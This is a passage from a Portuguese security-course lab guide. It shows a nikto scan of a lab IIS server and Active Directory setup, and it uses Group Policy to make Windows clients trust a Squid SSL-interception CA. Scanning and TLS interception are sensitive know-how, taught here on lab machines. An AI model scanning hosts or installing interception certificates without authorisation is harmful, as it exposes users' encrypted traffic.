</div>
<div class="paragraph">
<p>O <code>nikto</code> é um <em>scanner</em> de servidores web <em>open source</em> que faz testes profundos procurando por arquivos/programas perigosos, versões de serviço desatualizadas, bem como problemas de configuração e exposição de dados. É uma ferramenta muito poderosa para identificar problemas comuns em servidores web, e deve sempre ser considerada pelo analista de segurança em suas análises.</p>
</div>
<div class="paragraph">
<p>No caso específico da máquina <em>LinServer-G</em>, como apenas fizemos a instalação do Apache e não há nenhum website instalado, o número de vulnerabilidades encontradas é baixo, quase todas informativas.</p>
</div>
</li>
<li>
<p>Use o <code>nikto</code> para escanear o servidor web IIS instalado na máquina <em>WinServer-G</em>.</p>
<div class="literalblock">
<div class="content">
<pre># nikto -host 172.16.1.20 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.1.20
+ Target Hostname:    172.16.1.20
+ Target Port:        80
+ Start Time:         2018-09-08 08:47:07 (GMT-3)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
+ /: Appears to be a default IIS 7 install.
+ 26165 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2018-09-08 08:50:32 (GMT-3) (205 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</pre>
</div>
</div>
<div class="paragraph">
<p>Da mesma forma que o <em>host</em> <em>LinServer-G</em>, a instalação do IIS na máquina <em>WinServer-G</em> é basicamente a padrão e, especialmente após a atualização do sistema que fizemos na atividade (3) desta sessão, apresenta apenas notificações informativas.</p>
</div>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_9_configuração_segura_de_servidores_windows">Sessão 9: Configuração segura de servidores Windows</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_configuração_do_controlador_de_domínio_active_directory">1) Configuração do controlador de domínio <strong><em>Active Directory</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada na máquina virtual <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nesta atividade iremos instalar e configurar a <em>role</em> <em>Active Directory</em> na máquina <em>WinServer-G</em>, tornando-o um controlador de domínio primário (também conhecido como AD DC&#8201;&#8212;&#8201;<em>Active Directory Domain Controller</em>) para o domínio <code>domainG.esr.local</code>, sendo <code>G</code> a letra associada ao seu grupo. Para fazer isso, siga os passos abaixo:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Acesse a máquina <em>WinServer-G</em> como o usuário <code>Administrator</code>. Acesse <em>Start</em> &gt; <em>Run&#8230;&#8203;</em> e digite <code>dcpromo.exe</code>. Clique em <em>OK</em>. O Windows Server irá iniciar o processo de instalação dos binários do <em>Active Directory</em> na máquina e, ao final do processo, irá abrir o <em>wizard</em> de configuração como se segue:</p>
<div id="img-ad1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ad1.png" alt="ad1">
</div>
<div class="title">Figure 98. Tela inicial de configuração do AD DC</div>
</div>
<div class="paragraph">
<p>Marque a opção <em>Use advanced mode installation</em> e clique em <em>Next</em>.</p>
</div>
</li>
<li>
<p>Na tela <em>Operating System Compatibility</em>, clique em <em>Next</em>.</p>
</li>
<li>
<p>Na tela <em>Choose a Deployment Configuration</em>, selecione <em>Create a new domain in a new forest</em>, como mostrado abaixo, e clique em <em>Next</em>.</p>
<div id="img-ad2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ad2.png" alt="ad2">
</div>
<div class="title">Figure 99. Escolha de tipo de instalação do AD DC</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Na tela <em>Name the Forest Root Domain</em>, escolha o FQDN do seu domínio. Se estiver no grupo A, digite <code>domainA.esr.local</code>; no grupo B, digite <code>domainB.esr.local</code>. Verifique sua entrada de acordo com a imagem que se segue, e clique em <em>Next</em>.</p>
<div id="img-ad3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ad3.png" alt="ad3">
</div>
<div class="title">Figure 100. Escolha do FQDN do AD DC</div>
</div>
</li>
<li>
<p>Na tela subsequente, <em>Domain NetBIOS Name</em>, escolha <code>DOMAINA</code> ou <code>DOMAINB</code> (dependendo do seu grupo) e clique em <em>Next</em>.</p>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Na página <em>Set Forest Functional Level</em>, selecione o nível funcional de floresta que acomoda os controladores de domínio a serem instalados em qualquer lugar da floresta. Como teremos somente controladores de domínio Windows 2008 Server e acima, utilizaremos o nível funcional <code>Windows 2008 Server</code>. Confira sua seleção de acordo com a imagem a seguir, e clique em <em>Next</em>.</p>
<div id="img-ad4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ad4.png" alt="ad4">
</div>
<div class="title">Figure 101. Escolha do nível funcional da floresta AD DC</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Na tela <em>Additional Domain Controller Options</em>, mantenha a opção <code>DNS Server</code> marcada, indicando que a infraestrutura DNS da sua floresta deverá ser criada durante a instalação do AD DS. Em seguida, clique em <em>Next</em>.</p>
<div class="paragraph">
<p>O sistema irá informar que uma delegação DNS para o servidor local (a máquina <em>WinServer-G</em>) não pode ser criada pois o servidor DNS autoritativo não está usando o servidor DNS do Windows, como se segue:</p>
</div>
<div id="img-ad5" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ad5.png" alt="ad5">
</div>
<div class="title">Figure 102. Erro na delegação DNS do AD DC</div>
</div>
<div class="paragraph">
<p>Após ler a mensagem de aviso, clique em <em>Yes</em> para continuar.</p>
</div>
</li>
<li>
<p>Na tela <em>Location for Database, Log Files and SYSVOL</em>, mantenha os valores propostos pelo instalador e clique em <em>Next</em>.</p>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Na tela <em>Directory Services Restore Mode Administrator Password</em>, defina uma senha para o modo de recuperação dos serviços de diretório do AD DC a ser usada em casos de falha. Para este exemplo, defina a senha como <code>rnpesr</code>, como mostrado abaixo. Em seguida, clique em <em>Next</em>.</p>
<div id="img-ad6" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/ad6.png" alt="ad6">
</div>
<div class="title">Figure 103. Definição da senha do modo de recuperação do AD DC</div>
</div>
</li>
<li>
<p>Na tela <em>Summary</em>, verifique se todas as opções definidas para o servidor do <em>Active Directory</em> estão corretas; em caso positivo, clique em <em>Next</em>.</p>
</li>
<li>
<p>Ao final do processo de instalação da <em>role</em> AD DC, reinicie a máquina <em>WinServer-G</em> para concluir o processo de instalação.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_configuração_do_firewall_para_o_active_directory">2) Configuração do firewall para o <strong><em>Active Directory</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada na máquina virtual <em>FWGW1-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>O próximo passo seria adicionar a máquina <em>WinClient-G</em> ao domínio mas, antes disso, temos que configurar a <em>chain</em> FORWARD do firewall <em>FWGW1-G</em> para permitir o repasse dos pacotes nas portas relevantes.</p>
</div>
<div class="paragraph">
<p>A base de documentação da Microsoft, acessível através do link (<a href="https://support.microsoft.com/en-us/help/832017#method1" class="bare">https://support.microsoft.com/en-us/help/832017#method1</a>) lista um grande conjunto de portas a serem acessadas, como se segue:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Para ambientes que utilizam exclusivamente versões do Windows anteriores ao Windows Server 2008 e Windows Vista, deve-se habilitar conectividade das portas 1025 a 5000.</p>
</li>
<li>
<p>Para ambientes que utilizam apenas o Windows Server 2008 R2, Windows Server 2008, Windows 7 ou Windows Vista, deve-se habilitar conectividade das portas 49152 a 65535.</p>
</li>
<li>
<p>Para ambientes que utilizam tanto versões modernas quanto antigas do Windows, deve-se habilitar ambas as faixas acima, 1025 a 5000 e 49152 a 65535.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Além dessas portas, a figura a seguir mostra também quais portas conhecidas devem ser liberadas pelo firewall para conectividade.</p>
</div>
<div id="img-adports" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/adports.png" alt="adports">
</div>
<div class="title">Figure 104. Portas conhecidas para liberação do AD no firewall</div>
</div>
<div class="paragraph">
<p>Considerando o grande número de portas em questão, iremos permitir a faixa completa de conexão entre as máquinas <em>WinServer-G</em> e <em>WinClient-G</em>, para facilitar a configuração neste laboratório.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Acesse a máquina <em>FWGW1-G</em> como usuário <code>root</code> e permita trânsito irrestrito de pacotes entre as máquinas <em>WinServer-G</em> e <em>WinClient-G</em>. Considere o sentido do fluxo de pacotes em suas regras.</p>
<div class="literalblock">
<div class="content">
<pre># hostname ; whoami
FWGW1-A
root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A FORWARD -s 10.1.1.10/32 -d 172.16.1.20/32 -j ACCEPT</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_adição_de_clientes_ao_active_directory">3) Adição de clientes ao <strong><em>Active Directory</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada na máquina virtual <em>WinClient-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Vamos, agora sim, adicionar a máquina <em>WinClient-G</em> ao domínio. Acesse-a como usuário <code>Aluno</code> e abra as configurações de rede. Acesse <em>Iniciar</em> e digite <code>ncpa.cpl</code>. Em seguida, clique com o botão direito em <em>Conexão Local</em> e navegue para <em>Propriedades</em> &gt; <em>Protoloco TCP/IP Versão 4</em> &gt; <em>Propriedades</em>. Altere o servidor DNS primário para o IP da máquina <em>WinServer-G</em>, como se segue:</p>
<div id="img-adclient1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/adclient1.png" alt="adclient1">
</div>
<div class="title">Figure 105. Configuração DNS do cliente AD</div>
</div>
</li>
<li>
<p>Agora, navegue para <em>Painel de Controle</em> &gt; <em>Sistema e Segurança</em> &gt; <em>Sistema</em> &gt; <em>Alterar configurações</em>. Em seguida, clique no botão <em>Alterar&#8230;&#8203;</em> para mudar o domínio da máquina local. Na caixa <em>Membro de</em>, marque o botão <em>Domínio</em> e digite o FQDN do domínio configurado no passo (4) da atividade (1) desta sessão, como se segue.</p>
<div id="img-adclient2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/adclient2.png" alt="adclient2">
</div>
<div class="title">Figure 106. Inserindo o cliente AD no domínio</div>
</div>
<div class="paragraph">
<p>Clique em <em>OK</em>. O sistema irá exigir autenticação&#8201;&#8212;&#8201;você deve usar um usuário com permissões <strong>administrativas</strong> no AD DC, como o usuário <code>Administrator</code>. Informe, também, o domínio de autenticação do usuário. Trocando em miúdos, autentique-se como:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Nome de usuário: <code>DOMAINA\Administrator</code></p>
</li>
<li>
<p>Senha: <code>rnpesr</code></p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Após algum tempo de processamento, você deverá receber a mensagem <em>Bem vindo ao domínio domainG.esr.local</em>, como mostrado abaixo.</p>
</div>
<div id="img-adclient3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/adclient3.png" alt="adclient3">
</div>
<div class="title">Figure 107. Inserção do cliente AD no domínio com sucesso</div>
</div>
<div class="paragraph">
<p>Reinicie a máquina <em>WinClient-G</em> para concluir o processo.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_4_adição_de_usuários_ao_active_directory">4) Adição de usuários ao <strong><em>Active Directory</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>WinServer-G</em> e <em>WinClient-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Vamos criar um usuário não-privilegiado para autenticar-se no domínio. Logue na máquina <em>WinServer-G</em> como um usuário administrativo (por exemplo, <code>DOMAINA\Administrator</code>), e execute <em>Start</em> &gt; <em>Run&#8230;&#8203;</em> &gt; <code>dsa.msc</code>. Você deverá ver a tela do <em>Active Directory Users and Computers</em>, como se segue:</p>
<div id="img-aduser1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/aduser1.png" alt="aduser1">
</div>
<div class="title">Figure 108. Interface de edição de usuários e máquinas do AD</div>
</div>
</li>
<li>
<p>Expanda a floresta <code>domainA.esr.local</code>, e observe as pastas <em>Builtin</em>, <em>Computers</em>, <em>Domain Controllers</em>, <em>ForeignSecurityPrincipals</em> e <em>Users</em>. Para visualizar os usuários e grupos existentes no domínio, clique sobre a pasta <em>Users</em>.</p>
<div id="img-aduser2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/aduser2.png" alt="aduser2">
</div>
<div class="title">Figure 109. Visão de usuários e grupos existentes no AD</div>
</div>
<div class="paragraph">
<p>De igual forma, para ver os computadores adicionados ao AD, basta clicar sobre a pasta <em>Computers</em>.</p>
</div>
</li>
<li>
<p>Para adicionar um novo usuário, clique com o botão direito sobre a pasta <em>Users</em>, e em seguida <em>New</em> &gt; <em>User</em>. Crie um usuário com os seguintes dados:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>First name</em>: Indiana</p>
</li>
<li>
<p><em>Last name</em>: Jones</p>
</li>
<li>
<p><em>Initials</em>: IJ</p>
</li>
<li>
<p><em>Full name</em>: Henry Walton Jones Jr.</p>
</li>
<li>
<p><em>User logon name</em>: <code>indyjones@domainA.esr.local</code></p>
</li>
<li>
<p><em>User logon name (pre-Windows 2000)</em>: <code>DOMAINA\indyjones</code></p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Preenchidos os dados, clique em <em>Next</em>.</p>
</div>
</li>
<li>
<p>Na tela de definição de senha, devemos escolher uma senha suficientemente complexa para que o AD não a invalide. Uma senha como <code>RnpEsr!123</code> é uma boa escolha. Logo abaixo, mantenha marcada a caixa <em>User must change password at next logon</em>, e todas as demais desmarcadas. Clique em <em>Next</em>.</p>
</li>
<li>
<p>Na tela de confirmação dos dados, verifique que tudo está correto como mostrado a seguir, e clique em <em>Finish</em>.</p>
<div id="img-aduser3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/aduser3.png" alt="aduser3">
</div>
<div class="title">Figure 110. Confirmação de adição de usuário ao AD</div>
</div>
</li>
<li>
<p>De volta à máquina <em>WinClient-G</em>, tente logar com o usuário <code>indyjones</code> recém-criado. Clique no botão <em>Trocar Usuário</em> &gt; <em>Outro Usuário</em> e digite os dados inseridos nos passos (3) e (4). Observe que o logon será feito no domínio <code>DOMAINA</code>, como objetivado.</p>
<div id="img-adlogon1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/adlogon1.png" alt="adlogon1">
</div>
<div class="title">Figure 111. Logon inicial no AD</div>
</div>
<div class="paragraph">
<p>Imediatamente, o AD reporta que a senha deve ser alterada no primeiro logon&#8201;&#8212;&#8201;isso faz sentido, pois mantivemos a caixa <em>User must change password at next logon</em> marcada quando da criação do usuário no passo (4). Escolha uma nova senha, diferente da primeira e igualmente complexa (sugestão: <code>Seg2@rnp!</code>), e confirme o logon.</p>
</div>
<div class="paragraph">
<p>Finalmente, verifique que você está de fato logado na máquina como o usuário do domínio.</p>
</div>
<div id="img-adlogon2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/adlogon2.png" alt="adlogon2">
</div>
<div class="title">Figure 112. Verificação de logon no AD</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_5_distribuição_de_configurações_via_gpos">5) Distribuição de configurações via GPOs</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em>, <em>WinServer-G</em> e <em>WinClient-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Iremos agora usar GPOs (<em>Group Policy Objects</em>) para fazer configurações centralizadas de máquinas clientes do domínio. De fato, iremos usar as GPOs para resolver um problema que já tivemos anteriormente neste curso: a adição de certificados de ACs para <em>man-in-the-middle</em>, especificamente o do Squid <em>SslBump Peek and Splice</em> (sessão 7, atividade 2).</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiro, acesse a máquina <em>FWGW1-G</em> como usuário <code>root</code> e volte a executar o Squid em modo de interceptação de tráfego SSL, como fizemos anteriormente. Caso as regras de firewall não estejam mais ativas, reinsira-as e execute o Squid:</p>
<div class="literalblock">
<div class="content">
<pre># hostname ; whoami
FWGW1-A
root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -t nat -A PREROUTING -i enp0s9 -p tcp -m tcp --dport 80  -j REDIRECT --to-port 8080
# iptables -t nat -A PREROUTING -i enp0s9 -p tcp -m tcp --dport 443 -j REDIRECT --to-port 8443
# iptables -A INPUT -s 10.1.1.0/24 -p tcp -m tcp -m multiport --dports 8080,8443 -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># /usr/local/sbin/squid -f /usr/local/etc/squid.conf</pre>
</div>
</div>
</li>
<li>
<p>Na máquina <em>WinClient-G</em>, tente acessar um website via HTTPS para testar se a interceptação está ativa. No exemplo abaixo, estamos acessando o <a href="https://facebook.com" class="bare">https://facebook.com</a> ; note que o certificado é identificado como inválido (como esperado), e emitido pela CA da máquina <code>fwgw1-g.esr.rnp.br</code>:</p>
<div id="img-gpo1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo1.png" alt="gpo1">
</div>
<div class="title">Figure 113. Detecção de certificado forjado não-confiável na máquina WinClient-G</div>
</div>
</li>
<li>
<p>Para resolver o problema, vamos adicionar o certificado do Squid instalado na máquina <em>FWGW1-G</em> à base de certificados raiz confiáveis, como fizemos anteriormente. Mas, ao invés de fazer isso manualmente, vamos usar o AD e as GPOs para realizar essa tarefa. Copie o certificado localizado em <code>/usr/local/etc/ssl/public.crt</code> (na máquina <em>FWGW1-G</em>) para o <em>Desktop</em> da máquina <em>WinServer-G</em>&#8201;&#8212;&#8201;use o programa <code>WinSCP</code> ou a pasta compartilhada pelo Virtualbox, como preferir.</p>
<div class="paragraph">
<p>Ao final do processo, você deverá ter a chave pública da CA do Squid disponível na máquina <em>WinServer-G</em>, como mostrado abaixo.</p>
</div>
<div id="img-gpo2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo2.png" alt="gpo2">
</div>
<div class="title">Figure 114. Cópia do certificado da CA do Squid para a máquina WinServer-G</div>
</div>
</li>
<li>
<p>Vamos criar uma política para distribuição do certificado copiado. Execute <em>Start</em> &gt; <em>Run&#8230;&#8203;</em> &gt; <code>gpmc.msc</code>. Você deverá ver a tela do <em>Group Policy Management</em>, como se segue:</p>
<div id="img-gpo3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo3.png" alt="gpo3">
</div>
<div class="title">Figure 115. Ferramenta para gestão de políticas no AD</div>
</div>
</li>
<li>
<p>Expanda a floresta <code>domainA.esr.local</code>, e em seguida <em>Domains</em>. Clique com o botão direito no domínio <code>domainA.esr.local</code>, e em seguida em <em>Create a GPO in this domain, and Link it here&#8230;&#8203;</em>. Para o nome da GPO, digite <em>squidcert</em>, e em seguida clique em <em>OK</em>. Uma nova política deve surgir na lista do painel direito, como mostrado abaixo:</p>
<div id="img-gpo4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo4.png" alt="gpo4">
</div>
<div class="title">Figure 116. Criação de nova GPO</div>
</div>
</li>
<li>
<p>Clique com o botão direito na política <em>squidcert</em>, e em seguida em <em>Edit</em>. Surgirá uma nova janela para edição de políticas, idêntica à invocada pelo <em>snap-in</em> <code>gpedit.msc</code>. Navegue para <em>Computer Configuration</em> &gt; <em>Policies</em> &gt; <em>Windows Settings</em> &gt; <em>Security Settings</em> &gt; <em>Public Key Policies</em>, clique com o botão direito em <em>Trusted Root Certification Authorities</em>, como mostrado abaixo. Em seguida, clique em <em>Import</em>.</p>
<div id="img-gpo5" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo5.png" alt="gpo5">
</div>
<div class="title">Figure 117. Navegando na tela de edição de políticas</div>
</div>
</li>
<li>
<p>Será aberta uma tela de adição de certificado idêntica à que usamos na sessão 7. Aponte o certificado do Squid baixado no passo (3) desta atividade, e confirme todas as janelas de adição do certificado. Ao final, você deverá vê-lo adicionado ao <em>Trusted Root Certification Authorities</em> da GPO, como mostrado a seguir.</p>
<div id="img-gpo6" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo6.png" alt="gpo6">
</div>
<div class="title">Figure 118. Certificado do Squid adicionado à GPO</div>
</div>
</li>
<li>
<p>Tudo pronto! Feche a janela do <em>Group Policy Management Editor</em> e do <em>Group Policy Management</em>, e volte à máquina <em>WinClient-G</em>. Segundo a <em>knowledge base</em> da Microsoft (<a href="https://msdn.microsoft.com/en-us/library/ms813077.aspx" class="bare">https://msdn.microsoft.com/en-us/library/ms813077.aspx</a>), as GPOs são atualizadas de 90 em 90 minutos, com <em>offsets</em> aleatórios de 30 minutos. Como não queremos esperar tudo isso para verificar nossa configuração, abra (novamente, na máquina <em>WinClient-G</em>) uma janela do <em>prompt</em> de comando e digite <code>gpupdate /force</code> para atualizar as GPOs imediatamente:</p>
<div id="img-gpo7" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo7.png" alt="gpo7">
</div>
<div class="title">Figure 119. Forçando atualização de GPOs imediatamente</div>
</div>
</li>
<li>
<p>Abra o navegador e tente acessar um website em HTTPS, como o <a href="https://facebook.com" class="bare">https://facebook.com</a>  que havia sido acessado anteriormente. Note que, agora, o navegador reporta o certificado forjado pela CA do Squid como confiável.</p>
<div id="img-gpo8" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo8.png" alt="gpo8">
</div>
<div class="title">Figure 120. Detecção de certificado da CA do Squid como confiável</div>
</div>
</li>
<li>
<p>De fato, verificando a lista de certificados raiz confiáveis do sistema, o da máquina <em>FWGW1-G</em> consta da lista.</p>
<div id="img-gpo9" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/gpo9.png" alt="gpo9">
</div>
<div class="title">Figure 121. Certificado da CA do Squid adicionado à lista de certificadoras raiz confiáveis</div>
</div>
<div class="paragraph">
<p>Com efeito, nossa configuração via GPO funcionou corretamente&#8201;&#8212;&#8201;em um cenário com dezenas de clientes Windows, ou mesmo centenas, você poderia usar um esquema de configuração como este para distribuir o certificado do seu <em>proxy</em> de forma imediata.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_6_instalação_e_configuração_do_wsus">6) Instalação e configuração do WSUS</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada na máquina virtual <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Acesse a máquina <em>WinServer-G</em> como um usuário administrativo (por exemplo, <code>DOMAINA\Administrator</code>) e verifique que todos as atualizações de segurança da Microsoft estão aplicadas. Execute <em>Start</em> &gt; <em>Windows Update</em> e verifique que o servidor está totalmente atualizado, como mostrado abaixo.</p>
<div id="img-wsus1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus1.png" alt="wsus1">
</div>
<div class="title">Figure 122. Máquina WinServer-G atualizada</div>
</div>
</li>
<li>
<p>Ainda na máquina <em>WinServer-G</em>, abra o <em>Server Manager</em> e em seguida navegue para <em>Roles</em> &gt; <em>Web Server (IIS)</em> &gt; <em>Add Role Services</em>. Nos serviços abaixo, marque as caixas que se seguem:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Application Development</em> (aceitando a instalação da dependência <em>Windows Process Activation Service</em> &gt; <em>.NET Environment</em>):</p>
<div class="ulist">
<ul>
<li>
<p><em>ASP .NET</em></p>
</li>
<li>
<p><em>ISAPI Extensions</em></p>
</li>
<li>
<p><em>ISAPI Filters</em></p>
</li>
<li>
<p><em>.NET Extensibility</em></p>
</li>
</ul>
</div>
</li>
<li>
<p><em>Performance</em>:</p>
<div class="ulist">
<ul>
<li>
<p><em>Dynamic Content Compression</em></p>
</li>
</ul>
</div>
</li>
<li>
<p><em>Security</em>:</p>
<div class="ulist">
<ul>
<li>
<p><em>Windows Authentication</em></p>
</li>
</ul>
</div>
</li>
</ul>
</div>
</div>
</div>
<div id="img-wsus2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus2.png" alt="wsus2">
</div>
<div class="title">Figure 123. Instalação das dependências do WSUS</div>
</div>
<div class="paragraph">
<p>Confirme que suas seleções estão corretas e clique em <em>Next</em>, e em seguida em <em>Install</em>.</p>
</div>
</li>
<li>
<p>A seguir, desligue a máquina <em>WinServer-G</em>. Iremos adicionar um novo disco para instalação do WSUS no Virtualbox&#8201;&#8212;&#8201;o procedimento é bastante similar ao que fizemos para a instalação do Nessus na sessão 8.</p>
<div class="paragraph">
<p>Na console administrativa do Virtualbox, selecione a máquina <em>WinServer-G</em> e navegue para <em>Settings</em> &gt; <em>Storage</em> &gt; <em>SATA Controller</em> &gt; <em>Add hard disk</em>. Na nova tela, selecione <em>Create new disk</em>, formato VDI, <em>Dynamically allocated</em> e aloque um espaço de 20 GB para o disco, com nome <code>wsus</code>. Finalmente, clique em <em>Create</em>.</p>
</div>
<div class="paragraph">
<p>Ao final do processo, ligue novamente a máquina <em>WinServer-G</em>, e faça login como <code>DOMAINA\Administrator</code>.</p>
</div>
</li>
<li>
<p>Execute <em>Start</em> &gt; <em>Run&#8230;&#8203;</em> &gt; <code>diskmgmt.msc</code>. Imediatamente, o sistema detectará o novo disco e irá sugerir sua inicialização, como mostrado a seguir:</p>
<div id="img-wsus-disk1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-disk1.png" alt="wsus disk1">
</div>
<div class="title">Figure 124. Inicialização do disco para o WSUS</div>
</div>
<div class="paragraph">
<p>Mantenha marcada a caixa <em>MBR (Master Boot Record)</em> e clique em <em>OK</em>. Em seguida, clique com o botão direito no novo disco (o nome dele deve ser <em>Disk 1</em>), e selecione <em>New Simple Volume&#8230;&#8203;</em>.</p>
</div>
<div class="paragraph">
<p>Na nova janela, clique em <em>Next</em>. Na tela <em>Specify Volume Size</em>, mantenha o valor máximo de 20477 MB e clique em <em>Next</em>. Em <em>Assign Drive Letter or Path</em>, mantenha marcada a caixa <em>Assign the following drive letter</em> e escolha uma letra não-utilizada do sistema, como <code>K:</code> por exemplo.</p>
</div>
<div class="paragraph">
<p>Em <em>Format Partition</em>, mantenha marcada a caixa <em>Format this volume with the following settings</em> e escolha:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>File system</em>: NTFS</p>
</li>
<li>
<p><em>Allocation unit size</em>: <em>Default</em></p>
</li>
<li>
<p><em>Volume label</em>: WSUS</p>
</li>
<li>
<p><em>Perform a quick format</em>: marcada</p>
</li>
<li>
<p><em>Enable file and folder compression</em>: desmarcada</p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Clique em <em>Next</em>. Na tela seguinte, verifique que todas as opções de formatação do volume estão corretas, como se segue:</p>
</div>
<div id="img-wsus-disk2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-disk2.png" alt="wsus disk2">
</div>
<div class="title">Figure 125. Formatação do volume para o WSUS</div>
</div>
<div class="paragraph">
<p>Clique em <em>Finish</em>. Ao final do processo, feche a janela do <em>Disk Management</em> e verifique que o novo volume <code>K:</code>, com <em>label</em> <code>WSUS</code>, está disponível no <em>Windows Explorer</em>.</p>
</div>
</li>
<li>
<p>Agora, baixe o pacote do <em>Windows Server Update Services</em> 3.0 SP2, disponível em <a href="https://www.microsoft.com/en-us/download/details.aspx?id=5216" class="bare">https://www.microsoft.com/en-us/download/details.aspx?id=5216</a> , e inicie sua instalação.</p>
<div id="img-wsus3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus3.png" alt="wsus3">
</div>
<div class="title">Figure 126. Instalação do WSUS</div>
</div>
</li>
<li>
<p>Na tela <em>Installation Mode Selection</em>, marque <em>Full server installation including Administration Console</em> e clique em <em>Next</em>.</p>
</li>
<li>
<p>Em <em>License Agreement</em>, marque a caixa <em>I accept the terms of the License agreement</em> e clique em <em>Next</em>.</p>
</li>
<li>
<p>Na tela <em>Required Components to use administration UI</em>, clique em <em>Next</em>. Iremos instalar essa dependência a seguir.</p>
</li>
<li>
